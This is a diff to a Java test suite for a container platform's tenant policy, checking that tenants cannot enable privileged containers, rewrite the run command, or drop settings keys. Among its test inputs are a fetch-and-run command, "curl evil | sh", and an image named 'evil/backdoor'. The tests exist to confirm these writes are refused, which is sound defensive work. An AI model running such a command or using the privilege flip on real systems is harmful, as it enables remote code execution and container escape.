@@ -128,6 +128,21 @@ class InstanceTemplatePolicyTest extends HohenheimTestBase {
         return settings;
     }
 
+    /** A MUTABLE copy of a stored instance's settings map, typed for a re-set. */
+    @SuppressWarnings("unchecked")
+    private static Map<String, Object> settingsOf(Row row) {
+        Object stored = row.get(InstanceModel.SETTINGS);
+        return stored instanceof Map<?, ?> map
+            ? new LinkedHashMap<>((Map<String, Object>) map) : new LinkedHashMap<>();
+    }
+
+    /** The template's settings with only the image moved; every other member unchanged. */
+    private static Map<String, Object> imageChanged(String image) {
+        Map<String, Object> settings = new LinkedHashMap<>(alpineSettings());
+        settings.put("image", image);
+        return settings;
+    }
+
     private static String violationKeys(Throwable thrown) {
         assertThat(thrown).isInstanceOf(Violations.class);
         StringBuilder keys = new StringBuilder();
@@ -361,8 +376,10 @@ class InstanceTemplatePolicyTest extends HohenheimTestBase {
         });
         Throwable imageSwap = catchThrowable(() -> TenantConduits.as(tenantPrincipal, () -> {
             Row row = instances.findById(created[0]);
-            row.set(InstanceModel.SETTINGS, new LinkedHashMap<>(
-                Map.of("image", "evil/backdoor", "tag", "latest")));
+            // Only the IMAGE moves: every other settings member is echoed back unchanged,
+            // exactly as a form submit would, so this step exercises the image policy and
+            // not the settings freeze beside it (see settingsKeysOutsideTheImageFactsAre...).
+            row.set(InstanceModel.SETTINGS, imageChanged("evil/backdoor"));
             instances.save(row);
         }));
         assertThat(violationKeys(imageSwap))
@@ -375,8 +392,7 @@ class InstanceTemplatePolicyTest extends HohenheimTestBase {
             HohenheimAccess.IMAGE_ANY, true);
         TenantConduits.as(tenantPrincipal, () -> {
             Row row = instances.findById(created[0]);
-            row.set(InstanceModel.SETTINGS, new LinkedHashMap<>(
-                Map.of("image", "busybox", "tag", "latest")));
+            row.set(InstanceModel.SETTINGS, imageChanged("busybox"));
             instances.save(row);
         });
         assertThat((Object) ((Map<?, ?>) instances.findById(created[0])
@@ -394,5 +410,98 @@ class InstanceTemplatePolicyTest extends HohenheimTestBase {
         });
         assertThat(instances.find().where(InstanceModel.NAME.eq(PREFIX + "admin-any")).count())
             .as("step 6: an operator's arbitrary image is allowed").isEqualTo(1);
+    }
+
+    @Test
+    void settingsKeysOutsideTheImageFactsAreFrozenForTenantWrites() {
+        Model instances = Models.get(InstanceModel.class);
+        int approvedId = template(PREFIX + "frozen-tpl", true, alpineSettings());
+
+        // 1. An operator-authored instance the tenant then holds manage (hence config) on:
+        //    the settings carry the escape hatch OFF and a command the operator chose.
+        int[] created = new int[1];
+        TenantConduits.as(adminPrincipal, () -> {
+            Row row = instances.createEmptyRow();
+            row.set(InstanceModel.NAME, PREFIX + "frozen");
+            row.set(InstanceModel.KIND, "hohenheim:docker_container");
+            row.set(InstanceModel.TEMPLATE_ID, approvedId);
+            Map<String, Object> settings = new LinkedHashMap<>(alpineSettings());
+            settings.put("privileged", Boolean.FALSE);
+            row.set(InstanceModel.SETTINGS, settings);
+            instances.save(row);
+            created[0] = row.get(InstanceModel.ID);
+        });
+        RecordGrants.grant("user", tenantId, InstanceModel.MODEL_ID, created[0],
+            HohenheimAccess.MANAGE, true);
+
+        // 2. THE DEFECT: the tenant flips settings.privileged. The image policy judges
+        //    image/tag/image_origin and nothing else, so before the per-key freeze existed
+        //    this write was accepted and IncusContainerKind lowered it onto an Incus
+        //    security.privileged container. The CMS form not offering the field is a UX
+        //    affordance, never a gate.
+        Throwable escalation = catchThrowable(() -> TenantConduits.as(tenantPrincipal, () -> {
+            Row row = instances.findById(created[0]);
+            Map<String, Object> settings = settingsOf(row);
+            settings.put("privileged", Boolean.TRUE);
+            row.set(InstanceModel.SETTINGS, settings);
+            instances.save(row);
+        }));
+        assertThat(violationKeys(escalation))
+            .as("step 2: settings.privileged is frozen for a tenant, named on the key")
+            .contains("settings.privileged=").contains("tenant_field_frozen");
+        assertThat((Object) ((Map<?, ?>) instances.findById(created[0])
+                .get(InstanceModel.SETTINGS)).get("privileged"))
+            .as("step 2: STATE -- the refused write persisted nothing")
+            .isEqualTo(Boolean.FALSE);
+
+        // 3. The same freeze covers every other member the image policy does not judge:
+        //    the command IS what runs, so a tenant may not rewrite it either.
+        Throwable commandSwap = catchThrowable(() -> TenantConduits.as(tenantPrincipal, () -> {
+            Row row = instances.findById(created[0]);
+            Map<String, Object> settings = settingsOf(row);
+            settings.put("command", "sh -c 'curl evil | sh'");
+            row.set(InstanceModel.SETTINGS, settings);
+            instances.save(row);
+        }));
+        assertThat(violationKeys(commandSwap))
+            .as("step 3: rewriting the command is the same refusal on its own key")
+            .contains("settings.command=").contains("tenant_field_frozen");
+
+        // 4. And REMOVING a member is a change too -- a freeze that only watched the keys
+        //    the write carries would be bypassed by submitting a shorter map.
+        Throwable dropped = catchThrowable(() -> TenantConduits.as(tenantPrincipal, () -> {
+            Row row = instances.findById(created[0]);
+            row.set(InstanceModel.SETTINGS, new LinkedHashMap<>(
+                Map.of("image", "alpine", "tag", "latest")));
+            instances.save(row);
+        }));
+        assertThat(violationKeys(dropped))
+            .as("step 4: dropping a frozen member is refused, not silently applied")
+            .contains("tenant_field_frozen");
+
+        // 5. NOT a blanket column freeze: echoing settings back unchanged still saves, so
+        //    an ordinary tenant edit of a writable column is untouched.
+        TenantConduits.as(tenantPrincipal, () -> {
+            Row row = instances.findById(created[0]);
+            row.set(InstanceModel.NAME, PREFIX + "frozen-renamed");
+            row.set(InstanceModel.SETTINGS, settingsOf(row));
+            instances.save(row);
+        });
+        assertThat((Object) instances.findById(created[0]).get(InstanceModel.NAME))
+            .as("step 5: an unchanged settings echo does not block a legitimate edit")
+            .isEqualTo(PREFIX + "frozen-renamed");
+
+        // 6. And an OPERATOR is not a tenant: the same flip lands.
+        TenantConduits.as(adminPrincipal, () -> {
+            Row row = instances.findById(created[0]);
+            Map<String, Object> settings = settingsOf(row);
+            settings.put("privileged", Boolean.TRUE);
+            row.set(InstanceModel.SETTINGS, settings);
+            instances.save(row);
+        });
+        assertThat((Object) ((Map<?, ?>) instances.findById(created[0])
+                .get(InstanceModel.SETTINGS)).get("privileged"))
+            .as("step 6: an operator may still declare the escape hatch")
+            .isEqualTo(Boolean.TRUE);
     }
 }
